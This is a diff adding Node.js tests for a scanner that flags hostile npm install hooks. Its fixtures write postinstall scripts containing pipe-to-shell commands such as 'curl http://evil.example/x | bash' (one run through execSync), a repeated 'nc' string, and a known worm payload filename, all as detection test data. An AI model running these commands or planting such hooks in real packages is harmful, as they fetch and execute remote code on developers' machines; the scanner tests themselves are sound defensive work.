@@ -94,3 +94,73 @@ describe('lifecycle-scripts scanner', () => {
     assert.ok(hits[0].triggers.length >= 3);
   });
 });
+
+describe('lifecycle-scripts referenced files and robustness', () => {
+  const fs = require('fs');
+  const os = require('os');
+  const path = require('path');
+  const { scan } = require('../src/scanners/lifecycle-scripts');
+  let tmp;
+  const { beforeEach, afterEach } = require('node:test');
+  beforeEach(() => { tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'hg-lc-')); });
+  afterEach(() => { fs.rmSync(tmp, { recursive: true, force: true }); });
+
+  function pkg(dir, json, files = {}) {
+    fs.mkdirSync(dir, { recursive: true });
+    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify(json));
+    for (const [f, c] of Object.entries(files)) {
+      fs.mkdirSync(path.dirname(path.join(dir, f)), { recursive: true });
+      fs.writeFileSync(path.join(dir, f), c);
+    }
+  }
+
+  it('flags a known worm payload filename (Shai-Hulud setup_bun.js)', () => {
+    pkg(tmp, { scripts: { preinstall: 'node setup_bun.js' } }, { 'setup_bun.js': 'console.log(1)' });
+    const hits = checkScripts({ preinstall: 'node setup_bun.js' }, 'x', 'p', tmp);
+    assert.equal(hits.length, 1);
+    assert.equal(hits[0].severity, 'critical');
+    assert.ok(hits[0].triggers.includes('known-worm-filename'));
+  });
+
+  it('inspects the file a hook runs, not just the script string', () => {
+    const hits = (() => {
+      pkg(tmp, {}, { 'scripts/install.js': 'require("child_process").execSync("curl -s http://evil.example/x | sh")' });
+      return checkScripts({ postinstall: 'node scripts/install.js' }, 'x', 'p', tmp);
+    })();
+    assert.equal(hits.length, 1);
+    assert.ok(hits[0].triggers.includes('pipe-to-shell'));
+    assert.deepEqual(hits[0].script_files, ['scripts/install.js']);
+  });
+
+  it('does not flag a typical native-build installer', () => {
+    pkg(tmp, {}, { 'install.js': 'const { execSync } = require("child_process");\nconst https = require("https");\nexecSync("node-gyp rebuild", { env: process.env });' });
+    assert.equal(checkScripts({ postinstall: 'node install.js' }, 'x', 'p', tmp).length, 0);
+  });
+
+  it('ignores referenced files outside the package directory', () => {
+    fs.writeFileSync(path.join(tmp, 'outside.js'), 'curl http://1.2.3.4/x | bash');
+    const inner = path.join(tmp, 'inner');
+    fs.mkdirSync(inner);
+    assert.equal(checkScripts({ postinstall: 'node ../outside.js' }, 'x', 'p', inner).length, 0);
+  });
+
+  it('stays fast on hostile long scripts', () => {
+    const start = Date.now();
+    checkScripts({ postinstall: 'nc '.repeat(40000) }, 'x', 'p', tmp);
+    assert.ok(Date.now() - start < 500, `took ${Date.now() - start}ms`);
+  });
+
+  it('scans scoped, nested, and global node_modules', () => {
+    const proj = path.join(tmp, 'proj');
+    const evil = { scripts: { postinstall: 'curl http://evil.example/x | bash' } };
+    pkg(path.join(proj, 'node_modules', '@scope', 'a'), evil);
+    pkg(path.join(proj, 'node_modules', 'b', 'node_modules', 'c'), evil);
+    pkg(path.join(tmp, 'global', 'lib', 'node_modules', 'g'), evil);
+    const r = scan({ npmGlobalDirs: [path.join(tmp, 'global')] }, {}, [{ project: 'proj', project_path: proj }]);
+    assert.deepEqual(r.findings.map(f => f.path.slice(tmp.length)).sort(), [
+      path.join('/global', 'lib', 'node_modules', 'g'),
+      path.join('/proj', 'node_modules', '@scope', 'a'),
+      path.join('/proj', 'node_modules', 'b', 'node_modules', 'c'),
+    ].sort());
+  });
+});
